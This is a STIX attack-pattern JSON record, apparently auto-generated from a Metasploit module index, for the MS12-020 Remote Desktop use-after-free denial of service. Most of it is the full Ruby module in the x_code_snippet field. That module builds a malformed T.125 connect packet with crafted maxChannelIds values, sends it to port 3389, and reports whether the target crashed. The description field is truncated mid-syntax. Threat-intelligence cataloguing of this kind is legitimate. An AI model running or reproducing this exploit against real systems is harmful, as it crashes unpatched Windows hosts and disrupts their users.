{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a2160760-ca9f-4765-aa8d-38f36dff41a0",
    "created": "2024-08-14T16:25:05.207791Z",
    "modified": "2024-08-14T16:25:05.207794Z",
    "name": "MS12-020 Microsoft Remote Desktop Use-After-Free DoS",
    "description": " This module exploits the MS12-020 RDP vulnerability originally discovered and reported by Luigi Auriemma.  The flaw can be found in the way the T.125 ConnectMCSPDU packet is handled in the maxChannelIDs field, which will result an invalid pointer being used, therefore causing a denial-of-service condition.  'References'     => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/windows/rdp/ms12_020_maxchannelids.rb",
            "external_id": "ms12_020_maxchannelids.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.privatepaste.com/ffe875e04a"
        },
        {
            "source_name": "reference",
            "url": "http://pastie.org/private/4egcqt9nucxnsiksudy5dw"
        },
        {
            "source_name": "reference",
            "url": "http://pastie.org/private/feg8du0e9kfagng4rrg"
        },
        {
            "source_name": "reference",
            "url": "http://stratsec.blogspot.com.au/2012/03/ms12-020-vulnerability-for-breakfast.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2012/03/21/metasploit-update/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS12-020 Microsoft Remote Desktop Use-After-Free DoS',\n      'Description'    => %q{\n        This module exploits the MS12-020 RDP vulnerability originally discovered and\n        reported by Luigi Auriemma.  The flaw can be found in the way the T.125\n        ConnectMCSPDU packet is handled in the maxChannelIDs field, which will result\n        an invalid pointer being used, therefore causing a denial-of-service condition.\n      },\n      'References'     =>\n        [\n          [ 'CVE', '2012-0002' ],\n          [ 'MSB', 'MS12-020' ],\n          [ 'URL', 'http://www.privatepaste.com/ffe875e04a' ],\n          [ 'URL', 'http://pastie.org/private/4egcqt9nucxnsiksudy5dw' ],\n          [ 'URL', 'http://pastie.org/private/feg8du0e9kfagng4rrg' ],\n          [ 'URL', 'http://stratsec.blogspot.com.au/2012/03/ms12-020-vulnerability-for-breakfast.html' ],\n          [ 'EDB', '18606' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2012/03/21/metasploit-update/' ]\n        ],\n      'Author'         =>\n        [\n          'Luigi Auriemma',\n          'Daniel Godas-Lopez',  # Entirely based on Daniel's pastie\n          'Alex Ionescu',\n          'jduck',\n          '#ms12-020' # Freenode IRC\n        ],\n      'License'        => MSF_LICENSE,\n      'DisclosureDate' => '2012-03-16'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(3389)\n      ])\n  end\n\n  def is_rdp_up\n    begin\n      connect\n      disconnect\n      return true\n    rescue Rex::ConnectionRefused\n      return false\n    rescue Rex::ConnectionTimeout\n      return false\n    end\n  end\n\n  def run\n    max_channel_ids = \"\\x02\\x01\\xff\"\n\n    pkt = ''+\n      \"\\x03\\x00\\x00\\x13\" +  # TPKT: version + length\n      \"\\x0E\\xE0\\x00\\x00\" +  # X.224 (connection request)\n      \"\\x00\\x00\\x00\\x01\" +\n      \"\\x00\\x08\\x00\\x00\" +\n      \"\\x00\\x00\\x00\"     +\n      \"\\x03\\x00\\x00\\x6A\" +  # TPKT: version + length\n      \"\\x02\\xF0\\x80\"     +  # X.224 (connect-initial)\n      \"\\x7F\\x65\\x82\\x00\" +  # T.125\n      \"\\x5E\"             +\n      \"\\x04\\x01\\x01\"     +  # callingDomainSelector\n      \"\\x04\\x01\\x01\"     +  # calledDomainSelector\n      \"\\x01\\x01\\xFF\"     +  # upwardFlag\n      \"\\x30\\x19\"         +  # targetParameters\n      max_channel_ids    +  # maxChannelIds\n      \"\\x02\\x01\\xFF\"     +  # maxUserIds\n      \"\\x02\\x01\\x00\"     +  # maxTokenIds\n      \"\\x02\\x01\\x01\"     +  # numPriorities\n      \"\\x02\\x01\\x00\"     +  # minThroughput\n      \"\\x02\\x01\\x01\"     +  # maxHeight\n      \"\\x02\\x02\\x00\\x7C\" +  # maxMCSPDUsize\n      \"\\x02\\x01\\x02\"     +  # protocolVersion\n      \"\\x30\\x19\"         +  # minimumParameters\n      max_channel_ids    +  # maxChannelIds\n      \"\\x02\\x01\\xFF\"     +  # maxUserIds\n      \"\\x02\\x01\\x00\"     +  # maxTokenIds\n      \"\\x02\\x01\\x01\"     +  # numPriorities\n      \"\\x02\\x01\\x00\"     +  # minThroughput\n      \"\\x02\\x01\\x01\"     +  # maxHeight\n      \"\\x02\\x02\\x00\\x7C\" +  # maxMCSPDUsize\n      \"\\x02\\x01\\x02\"     +  # protocolVersion\n      \"\\x30\\x19\"         +  # maximumParameters\n      max_channel_ids    +  # maxChannelIds\n      \"\\x02\\x01\\xFF\"     +  # maxUserIds\n      \"\\x02\\x01\\x00\"     +  # maxTokenIds\n      \"\\x02\\x01\\x01\"     +  # numPriorities\n      \"\\x02\\x01\\x00\"     +  # minThroughput\n      \"\\x02\\x01\\x01\"     +  # maxHeight\n      \"\\x02\\x02\\x00\\x7C\" +  # maxMCSPDUsize\n      \"\\x02\\x01\\x02\"     +  # protocolVersion\n      \"\\x04\\x82\\x00\\x00\" +  # userData\n      \"\\x03\\x00\\x00\\x08\" +  # TPKT: version + length\n      \"\\x02\\xF0\\x80\"     +  # X.224\n      \"\\x28\"             +  # T.125\n      \"\\x03\\x00\\x00\\x08\" +  # TPKT: version + length\n      \"\\x02\\xF0\\x80\"     +  # X.224\n      \"\\x28\"             +  # T.125\n      \"\\x03\\x00\\x00\\x08\" +  # TPKT: version + length\n      \"\\x02\\xF0\\x80\"     +  # X.224\n      \"\\x28\"             +  # T.125\n      \"\\x03\\x00\\x00\\x08\" +  # TPKT: version + length\n      \"\\x02\\xF0\\x80\"     +  # X.224\n      \"\\x28\"             +  # T.125\n      \"\\x03\\x00\\x00\\x08\" +  # TPKT: version + length\n      \"\\x02\\xF0\\x80\"     +  # X.224\n      \"\\x28\"             +  # T.125\n      \"\\x03\\x00\\x00\\x08\" +  # TPKT: version + length\n      \"\\x02\\xF0\\x80\"     +  # X.224\n      \"\\x28\"             +  # T.125\n      \"\\x03\\x00\\x00\\x08\" +  # TPKT: version + length\n      \"\\x02\\xF0\\x80\"     +  # X.224\n      \"\\x28\"             +  # T.125\n      \"\\x03\\x00\\x00\\x08\" +  # TPKT: version + length\n      \"\\x02\\xF0\\x80\"     +  # X.224\n      \"\\x28\"             +  # T.125\n      \"\\x03\\x00\\x00\\x0C\" +  # TPKT: version + length\n      \"\\x02\\xF0\\x80\"     +  # X.224\n      \"\\x38\\x00\\x06\\x03\" +  # T.125\n      \"\\xF0\"             +\n      \"\\x03\\x00\\x00\\x09\" +  # TPKT: version + length\n      \"\\x02\\xF0\\x80\"     +  # X.224\n      \"\\x21\\x80\"            # T.125\n\n    unless is_rdp_up\n      print_error(\"#{rhost}:#{rport} - RDP Service Unreachable\")\n      return\n    end\n\n    connect\n    print_status(\"#{rhost}:#{rport} - Sending #{self.name}\")\n    sock.put(pkt)\n    Rex.sleep(3)\n    disconnect\n    print_status(\"#{rhost}:#{rport} - #{pkt.length.to_s} bytes sent\")\n\n    print_status(\"#{rhost}:#{rport} - Checking RDP status...\")\n\n    if is_rdp_up\n      print_error(\"#{rhost}:#{rport} - RDP Service Unreachable\")\n      return\n    else\n      print_good(\"#{rhost}:#{rport} seems down\")\n      report_vuln({\n        :host => rhost,\n        :port => rport,\n        :name => self.name,\n        :refs => self.references,\n        :info => \"Module #{self.fullname} successfully crashed the target system via RDP\"\n      })\n    end\n\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2012-03-16"
}